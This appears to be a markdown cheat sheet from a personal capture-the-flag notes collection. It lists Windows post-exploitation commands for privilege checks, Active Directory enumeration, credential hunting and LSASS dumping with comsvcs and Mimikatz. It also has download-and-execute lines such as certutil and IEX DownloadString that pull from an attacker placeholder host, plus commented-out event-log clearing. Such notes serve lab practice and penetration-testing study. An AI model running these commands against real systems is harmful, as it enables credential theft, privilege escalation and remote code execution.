# Windows Post-Exploitation Enumeration

Used on: **Wreath**

Wreath additions: `whoami /priv`, `whoami /groups`, `wmic service get name,displayname,pathname,startmode`, `sc qc <service>`, and `Get-Acl` were used to identify a writable unquoted service path.

Checklist for enumerating a Windows host after landing a shell (Meterpreter / WinRM / RDP / SSH). Commands marked **[USED]** appeared in the writeups in this repo; the rest are the default playbook — run them if the targeted checks don't yield anything.

> The canonical one-shot automated tool is **winPEAS**. This note is the by-hand equivalent, split by goal so you can run individual checks when pushing a full PEAS binary is not an option.

---

## 1. Where am I System Context

<!-- cmd: windows -->
```powershell
whoami                                  # [USED — Blueprint, Logging]
whoami /all                             # groups + privileges + SID
whoami /groups
whoami /priv
hostname
systeminfo                              # OS version, patch level, domain
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
[System.Environment]::OSVersion.Version
$PSVersionTable                         # PowerShell version
```

Equivalent `cmd.exe` one-liners:
<!-- cmd: windows -->
```cmd
ver
set
wmic os get caption,csname,version,buildnumber
```

---

## 2. User & Privileges

<!-- cmd: windows -->
```powershell
whoami /priv
net user                                # local users
net user <user>                         # details for one user
net user <user> /domain                 # [USED — after AD pivot]
net localgroup Administrators
net localgroup "Remote Management Users"
net group "Domain Admins" /domain
```

Red flags in `whoami /priv`:

| Privilege | Significance |
|-----------|-------------|
| `SeImpersonatePrivilege` | Potato family (Juicy/Rogue/Print/God)  SYSTEM |
| `SeAssignPrimaryTokenPrivilege` | Same family |
| `SeBackupPrivilege` | Read SAM / SYSTEM / security hives |
| `SeRestorePrivilege` | Write over protected files |
| `SeTakeOwnershipPrivilege` | Re-ACL system paths |
| `SeDebugPrivilege` | Dump LSASS |
| `SeLoadDriverPrivilege` | Kernel driver load  PrivEsc |
| `SeManageVolumePrivilege` | AlwaysInstallElevated-like chain |
| `SeTrustedCredManAccessPrivilege` | Read saved creds |

---

## 3. Domain Context

<!-- cmd: windows -->
```powershell
# Am I domain-joined
(Get-WmiObject Win32_ComputerSystem).PartOfDomain
(Get-WmiObject Win32_ComputerSystem).Domain

# Domain controllers
nltest /dsgetdc:<domain>
Get-ADDomainController -Discover -DomainName <domain>

# Trusts
nltest /trusted_domains
nltest /domain_trusts /all_trusts
```

### PowerView (when allowed)
<!-- cmd: windows -->
```powershell
Import-Module .\PowerView.ps1
Get-Domain
Get-DomainController
Get-DomainUser -Properties samaccountname,description | Where description
Get-DomainComputer -Properties samaccountname,operatingsystem
Get-DomainGroup | Where-Object {$_.Name -like "*admin*"}
Get-DomainUser -SPN                      # Kerberoastable
Get-DomainUser -PreauthNotRequired       # AS-REP roastable
```

### AD module (on DCs or with RSAT)
<!-- cmd: windows -->
```powershell
Get-ADUser -Filter * -Properties ServicePrincipalName | Where ServicePrincipalName
Get-ADUser -Filter 'DoesNotRequirePreAuth -eq $true'
```

---

## 4. Credentials on Disk

### Standard dumping grounds

<!-- cmd: windows -->
```powershell
# Saved creds (cmdkey)
cmdkey /list                            # [USED — Overwatch]

# Windows Credential Manager vault
vaultcmd /listcreds:"Web Credentials"
vaultcmd /listcreds:"Windows Credentials"

# Unattend / Sysprep answer files
dir C:\Windows\Panther\*.xml /s 2>nul
dir C:\Windows\System32\sysprep\*.xml /s 2>nul
findstr /si password C:\Windows\Panther\*.xml C:\Windows\System32\sysprep\*.xml

# Registry unattend
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "DefaultUser DefaultPassword AutoAdminLogon"

# Saved RDP creds
dir /s /a C:\Users\%USERNAME%\AppData\Local\Microsoft\Credentials\
dir /s /a C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Credentials\

# Putty saved sessions
reg query HKCU\Software\SimonTatham\PuTTY\Sessions\ /s

# WinSCP saved sessions
reg query HKCU\Software\Martin Prikryl\WinSCP 2\Sessions /s

# KeePass databases
dir /s /a C:\*.kdbx 2>nul
```

### String-level sweep for secrets

<!-- cmd: windows -->
```powershell
# Grep-equivalent across the filesystem (slow)
Get-ChildItem -Path C:\ -Recurse -Include *.xml,*.config,*.ini,*.ps1,*.bat,*.txt,*.properties -ErrorAction SilentlyContinue |
  Select-String -Pattern "password|passwd|pwd|secret|token|connectionstring" |
  Select-Object -First 100

# Just scripts in obvious places
Get-ChildItem C:\inetpub,C:\xampp,C:\Program` Files,C:\Program` Files` (x86),C:\Users -Recurse -Include *.config,*.ini,*.xml,*.ps1 -ErrorAction SilentlyContinue |
  Select-String "password"
```

### Dumping LSASS (when `SeDebugPrivilege` or Admin)
```
# built-in crash-dump via comsvcs.dll
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Windows\Temp\lsass.dmp full

# PowerSploit
Invoke-Mimikatz -DumpCreds
```

Transfer `lsass.dmp` to the attacker and parse with `pypykatz lsa minidump lsass.dmp`.

---

## 5. Scheduled Tasks & Services

<!-- cmd: windows -->
```powershell
# Scheduled tasks
schtasks /query /fo LIST /v               # [USED — baseline]
Get-ScheduledTask | Where-Object {$_.State -ne 'Disabled'} | Format-Table TaskName, TaskPath, State

# Services with misconfigured paths / ACLs (classic PrivEsc)
Get-WmiObject win32_service | Select Name, State, PathName, StartName
sc.exe qc <service_name>
accesschk64.exe -uwcqv "Everyone" *
accesschk64.exe -uwcqv "Authenticated Users" *
accesschk64.exe -uwcqv "NT Authority\Interactive" *
```

Look for:
- Unquoted service paths containing spaces (classic privesc via binary planting).
- Service binaries / directories writeable by your user.
- Services running as SYSTEM / LOCALSERVICE that a normal user can restart.

---

## 6. Networking

<!-- cmd: windows -->
```powershell
ipconfig /all
route print
arp -a
netstat -ano                              # [USED — when looking for loopback listeners]
netstat -anob                             # binary owning each connection (needs admin)
Get-NetTCPConnection | Where State -eq Listen
```

### DNS / AD services
<!-- cmd: windows -->
```powershell
nslookup -type=srv _ldap._tcp.dc._msdcs.<domain>
nslookup -type=srv _kerberos._tcp.<domain>
```

---

## 7. Interesting Files & Paths

<!-- cmd: windows -->
```powershell
# User profiles
dir C:\Users\
dir C:\Users\<user>\Desktop\
dir C:\Users\<user>\Documents\

# Common app data
dir "C:\Program Files\"
dir "C:\Program Files (x86)\"
dir C:\inetpub\wwwroot\ /s
dir C:\xampp\ /s

# WMI-enumerate installed software
wmic product get name,version                      # slow but complete
Get-WmiObject -Class Win32_Product | Select Name, Version | Format-Table

# Registry-based software (faster)
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName, DisplayVersion
Get-ItemProperty HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName, DisplayVersion

# History files
type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### Check for NSSM wrappers (Overwatch pivot)
Look for `nssm.exe` in service PathName — NSSM wraps non-service binaries as Windows services, and the wrapped binary is often replaceable:
<!-- cmd: windows -->
```powershell
Get-WmiObject win32_service | Where { $_.PathName -match 'nssm' }
```
See [nssm-service-abuse.md](../privesc-windows/nssm-service-abuse.md).

---

## 8. AD Sessions & Logged-On Users

<!-- cmd: windows -->
```powershell
# Who is logged on right now
query user
quser
Get-WmiObject -Class Win32_LoggedOnUser

# Session enumeration from a foothold (PowerView)
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"
Find-DomainProcess -ProcessName lsass
```

---

## 9. UAC / AppLocker / AMSI / Defender Posture

<!-- cmd: windows -->
```powershell
# UAC
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin

# AppLocker policy
Get-AppLockerPolicy -Effective -Xml

# AMSI / Defender
Get-MpComputerStatus
Get-MpPreference | Select-Object -Property ExclusionPath, DisableRealtimeMonitoring
```

---

## 10. Quick Wins Cheat Sheet

| Symptom | Check |
|---------|-------|
| `SeImpersonate` / `SeAssignPrimaryToken` | Potato family  SYSTEM |
| `cmdkey /list` shows entries | `runas /savecred /user:...` with saved creds |
| Unquoted service path | binary plant in writeable ancestor |
| Writeable service binary | overwrite + restart the service |
| Scheduled task running as SYSTEM and writeable | plant payload |
| `SeBackupPrivilege` or Admin | dump SAM / SECURITY hives (`reg save`) |
| Domain-joined + user | BloodHound  ACL path to DA |
| `GenericWrite` on Computer / MSA | Shadow Credentials (see `shadow-credentials.md`) |
| `SPN` set on user-type account | Kerberoast (`-m 13100`) |
| `DONT_REQ_PREAUTH` on account | AS-REP Roast (`-m 18200`) |

---

## 11. Automated Tooling

<!-- cmd: windows -->
```powershell
# winPEAS
certutil -urlcache -f http://<ATTACKER>/winPEAS.ps1 winPEAS.ps1   # [USED — Logging]
.\winPEAS.ps1 > resultados.txt 2>&1

# PowerUp (services / unquoted paths / reg ACLs)
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt (compiled alternative)
Seatbelt.exe all

# SharpUp
SharpUp.exe audit

# SharpHound (BloodHound collector)
.\SharpHound.exe -c All --zipfilename domain_collection
```

---

## 12. Transferring Payloads In

<!-- cmd: windows -->
```powershell
# certutil
certutil -urlcache -f http://<ATTACKER>/file.exe C:\Windows\Temp\file.exe    # [USED — Logging, Blueprint]

# PowerShell (IEX)
iex (New-Object Net.WebClient).DownloadString('http://<ATTACKER>/script.ps1')

# PowerShell (Invoke-WebRequest)
iwr http://<ATTACKER>/file.exe -OutFile C:\Windows\Temp\file.exe

# bitsadmin
bitsadmin /transfer job http://<ATTACKER>/file.exe C:\Windows\Temp\file.exe

# SMB
copy \\<ATTACKER>\share\file.exe C:\Windows\Temp\file.exe

# On the attacker
sudo python3 -m http.server 80             # [USED — every Windows box]
sudo smbserver.py share $(pwd) -smb2support
```

---

## 13. Cleanup

<!-- cmd: windows -->
```powershell
# Remove uploaded tools
del C:\Windows\Temp\winPEAS.ps1
del C:\Windows\Temp\shell.exe

# Clear event logs (ONLY during red-team engagements with explicit authorization)
# wevtutil cl System
# wevtutil cl Security
# wevtutil cl Application
```

Avoid log clearing on HTB/THM boxes — it is not necessary and is loud / noisy for no reason.

---

## Related
- [Linux enumeration playbook](linux-enumeration.md)
- [SMB enumeration playbook](../ad/smb-enumeration.md)
- [Binary credential hunting](../creds/binary-credential-hunting.md)
- [Shadow Credentials](../ad/shadow-credentials.md)
- [AS-REP Roast & Kerberoast](../ad/kerberos-roasting.md)
- [NSSM-wrapped service abuse](../privesc-windows/nssm-service-abuse.md)


